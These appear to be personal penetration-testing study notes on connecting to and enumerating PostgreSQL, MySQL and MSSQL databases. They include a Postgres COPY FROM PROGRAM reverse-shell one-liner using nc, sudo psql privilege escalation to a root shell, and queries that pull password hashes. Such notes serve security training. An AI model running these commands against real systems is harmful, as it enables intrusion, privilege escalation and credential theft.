# Databases notes 

## Connecting and interacting with Postgres
- config files 
Looking for Web `config.php` files. 

- connecting with credentials:
```bash
# locally
psql -U postgres -d webapp
# remote
psql -h <target-host> -p <port> -U <username> -W
```

- Enumerate database and tables 
```SQL
# list databases
\l

# switch database
\c <database_name>

# list tables in database 
\dt

# Extract data 
SELECT * FROM <table_name>;
```

- Reverse shell with postgres:
```SQL
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f';
``` 

- privilege escalation with sudo privileges on `psql`
Creating roles for `root`:
```SQL
CREATE ROLE root WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD 'root';
CREATE DATABASE root WITH OWNER root;
```

From GTFO: 
```bash
$ sudo psql
root=# \?
!/bin/sh
```

*sources :*
- *https://hackviser.com/tactics/pentesting/services/postgresql*
- *https://github.com/squid22/PostgreSQL_RCE/blob/main/postgresql_rce.py*
- *https://gtfobins.github.io/gtfobins/psql/#sudo*

## Connecting and interacting with MySQL

- connecting with credentials:
```bash
mysql -u root -p'password' -h <IP> -P <PORT>
```
- Some commands :
```
# show the MySQL version :
MySQL   > select version();

# show the current user : 
        > select system_user();

# show all databases :
        > show databases;

# Querying example (password of mysql)
        > SELECT user, authentication_string FROM mysql.user WHERE user='offsec';

# Selecting database :
        > use database_name;
# Listing tables (only after selecting database):
        > show tables; 
```

## Connecting and interacting wth MSSQL

- Connecting with creds using `impacket` (`-windows-auth` option forces NTLM auth)
```bash
$ impacket-mssqlclient Administrator:lab123@<IP> -windows-auth
```
- Some commands :
```
# show the MSSQL version :
SQL> select @@version;

# show all databases :
SQL> SELECT name FROM sys.databases;

# Querying example (querying the tables from database)
SQL> SELECT * FROM supersecretdatabase.information_schema.tables';

```
